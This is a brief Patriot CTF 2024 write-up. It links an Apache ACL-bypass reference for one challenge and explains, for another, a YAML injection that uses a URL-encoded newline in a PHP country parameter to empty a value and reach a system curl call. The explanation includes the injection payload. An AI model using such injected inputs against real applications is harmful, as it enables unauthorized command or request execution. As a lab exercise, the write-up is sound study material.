# DOGDAYS Patriot CTF 2024
@phulelouch
### Problem 1:

```
<Files "challenge.php">
    AuthType Basic 
    AuthName "Admin Panel"
    AuthUserFile "/etc/apache2/.htpasswd"
    Require valid-user
</Files>
```

### Solution for problem 1:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/apache#acl-bypass

### Problem 2:
```
...
$yaml = <<<EOF
- country: $input
- country_code: $countryList[$input]
EOF;

...
$parsed_arr = yaml_parse($yaml);
$cc = $parsed_arr[1]['country_code'];
...

function run($cc, $url) {

    echo "Country code: ".$cc."<br>";
    if (!$cc) {
        system(escapeshellcmd('curl '.$url));
    } 
    return;
}

```

### Way of thinking :
The key to exploiting this vulnerability lies in injecting additional YAML content through the country parameter. By manipulating the YAML structure, you can set the country_code to an empty value, thereby triggering the if (!$cc) condition without causing the application to die with "Country not found".
To perform YAML Injection, you need to inject a new YAML entry that sets country_code to an empty value. This can be achieved by including a newline character (\n) in the country parameter, 

```
Afghanistan
- country_code:
```
followed by a new YAML entry.
	•	Newline (\n) is URL-encoded as %0A.
	•	Space ( ) is URL-encoded as %20.
```
Afghanistan%0A-%20country_code:
```

##### What happen?
The malicious country parameter modifies the YAML structure as follows:
```
- country: Afghanistan
- country_code: 
- country_code: 
```
Parsed YAML Array:
```
$parsed_arr = [
    ['country' => 'Afghanistan'],
    ['country_code' => ''],
];
```
```
$cc = $parsed_arr[1]['country_code']; 
```
results in $cc being empty (null).

###  Solution:

![alt text](<Sept 22 Screenshot from Discord.png>)